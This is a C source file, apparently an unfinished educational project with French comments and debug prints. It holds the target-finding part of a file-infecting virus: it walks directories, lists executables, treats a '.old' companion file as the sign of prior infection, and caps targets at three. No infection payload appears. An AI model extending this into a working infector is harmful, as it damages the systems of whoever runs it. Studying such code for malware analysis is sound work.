#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <stdbool.h>

#define NB_TARGET_MAX 3

typedef struct Element Element;
struct Element
{
    Element *next;
    Element *prev;
    char path[1];
};

typedef struct List List;
struct List
{
    Element *p;
};

void printList(List *liste)
{
    if (liste == NULL)
    {
        return;
    }
    else
    {
        Element *actuel = liste->p;
        while (actuel != NULL)
        {
            printf("%s\n", actuel->path);
            actuel = actuel->prev;
        }
    }
}

List *init(char *file)
{
    List *list = malloc(sizeof(List));
    Element *newElem = malloc(sizeof(Element) + (strlen(file) + 1));
    if (!list || !newElem) {
        exit(EXIT_FAILURE);
    }
    strcpy(newElem->path, file);
    newElem->next = NULL;
    newElem->prev = NULL;
    list->p = newElem;
    return list;
}

List* insert(List **list, char* file)
{
    if (!*list){
        *list = init(file);
        return *list;
    }else{
        Element *newElem = malloc(sizeof(Element) + (strlen(file) + 1));
        if (!(*list) || !newElem) {
            exit(EXIT_FAILURE);
        }
        strcpy(newElem->path, file);

        newElem->prev = (*list)->p;
        newElem->next = NULL;
        if (*list && (*list)->p) {
            (*list)->p->next = newElem;
        }
        (*list)->p = newElem;
    }
    return *list;
}

bool    deleteItem(List **list, Element *deleteItem) {
    if (!*list && !deleteItem)
        return false;

    if (deleteItem->next) {
        deleteItem->next->prev = deleteItem->prev;
    }
    if (deleteItem->prev) {
        deleteItem->prev->next = deleteItem->next;
    }

    if ((*list)->p == deleteItem) {
        if (deleteItem->next) {
            (*list)->p = deleteItem->next;
        } else if (deleteItem->prev) {
            (*list)->p = deleteItem->prev;
        } else {
            (*list)->p = NULL;
        }
    }

    deleteItem->next = NULL;
    deleteItem->prev = NULL;
    free(deleteItem);
    return true;
}

bool isInfected(char* file, List *liste)
{
    if (!liste) {
        return false;
    }
    char cible[500];
    char *sufOld = ".old";
    sprintf(cible,"%s%s",file, sufOld);
    Element *actuel = liste->p;
    while (actuel != NULL) {
        if (strcmp(cible, actuel->path) == 0) {
            return true;
        }
        actuel = actuel->prev;
    }
    return false;
}


void    reasearch(List **fichiers, List **old, List** dirs) {
    DIR *dirp;
    struct dirent *entry;
    struct stat s;
    char *currentfolder;
    char fichier[500];

    if (*dirs && (*dirs)->p) {
        currentfolder = (*dirs)->p->path;
        dirp = opendir(currentfolder);

        while ((entry = readdir(dirp)) != NULL) {
            sprintf(fichier, "%s/%s", currentfolder, entry->d_name);
            printf("%s\n", fichier);//TODO

            if (stat(fichier, &s) != -1) {
                if (S_ISDIR(s.st_mode) && !strstr(entry->d_name, ".") && !strstr(entry->d_name, "..")) {
                    //TODO ->Passe pas avec des fichiers cachés comme ".idea" (. étant le fichier caché)
                    printf("isDir : %s\n", fichier); //TODO
                    insert(dirs, fichier);

                } else if ((s.st_mode & S_IXUSR) && (s.st_mode & S_IFREG)){
                    //TODO ->Passe avec "MonPg1.old.qqch" ou ".olderFile" (. étant le fichier caché)
                    if (!strstr(entry->d_name,".old")) {
                        printf("isExe : %s\n", fichier); //TODO
                        insert(fichiers, fichier);

                    } else {
                        printf("isOld : %s\n", fichier);
                        insert(old, fichier);
                    }
                }
            }
        }
        closedir(dirp);
    }
}

List    *searchFileToInfect(char *initPath) {
    List    *targets = NULL;
    List    *dirs = NULL;
    List    *files = NULL;
    List    *olds = NULL;

    Element *currentDir = NULL;
    int     nbTarget;

    nbTarget = 0;
    dirs = insert(&dirs, initPath);
    while ((currentDir = dirs->p) && nbTarget < NB_TARGET_MAX) {
        printf("\n----------------\nresearch -> [%s]\n-------------\n", dirs->p->path);//TODO
        reasearch(&files, &olds, &dirs);
        printf("\n");//TODO
        deleteItem(&dirs, currentDir);

        if (files) {
            Element *actualFile = NULL;

            printf("> test old:\n");//TODO
            while ((actualFile = files->p)) {
                if (!isInfected(actualFile->path, olds) && nbTarget < NB_TARGET_MAX) {
                    printf("TEST A CIBLER : %s\n", actualFile->path);//TODO
                    insert(&targets, actualFile->path);
                    nbTarget += 1;
                }
                //Moyen de ne pas delete et de juste skip si on veux permettre de chercher
                //un .old qui serait potentiellement plus haut que le fichier actuel
                deleteItem(&files, actualFile);
            }
        }

        //Delete les .old trouvé avant de partir sur un autre dossier
        if (olds) {
            printf("\n> delete old\n");//TODO
            Element *actualOld = NULL;
            while ((actualOld = olds->p)) {
                deleteItem(&olds, actualOld);
            }
        }
    }

    if (dirs) {
        printf("\n> delete dirs\n");//TODO
        Element *actualDir = NULL;
        while ((actualDir = dirs->p)) {
            deleteItem(&dirs, actualDir);
        }
        free(dirs);
    }

    if (files) {
        printf("\n> delete files\n");//TODO
        Element *actualFile = NULL;
        while ((actualFile = files->p)) {
            deleteItem(&files, actualFile);
        }
        free(files);
    }

    if (olds) {
        printf("\n> delete old\n");//TODO
        Element *actualOld = NULL;
        while ((actualOld = olds->p)) {
            deleteItem(&olds, actualOld);
        }
        free(olds);
    }

    return targets;
}

int main(){
    char PATH[_SC_UCHAR_MAX];

    if(getcwd(PATH, _SC_UCHAR_MAX) == NULL) {
        return EXIT_FAILURE;
    }


    List* cibles = NULL;
    cibles = searchFileToInfect(PATH);

    printf("\n\nresult:\n");
    printList(cibles);

    if (cibles) {
        Element *actualtarget = NULL;
        while ((actualtarget = cibles->p)) {
            deleteItem(&cibles, actualtarget);
        }
        free(cibles);
    }

    return EXIT_SUCCESS;
}
